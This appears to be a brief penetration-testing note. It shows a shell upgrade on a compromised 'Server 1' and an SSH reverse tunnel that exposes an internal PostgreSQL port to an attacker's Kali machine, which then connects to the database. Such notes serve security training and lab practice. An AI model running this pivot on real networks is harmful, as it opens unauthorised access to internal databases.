# Kali:
# PasswordAuthentication yes @ /etc/ssh/sshd_config
sudo systemctl start ssh

# Server 1:
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:172.0.0.2:5432 kali@10.0.0.9

# Kali:
psql -h 127.0.0.1 -p 2345 -U postgres

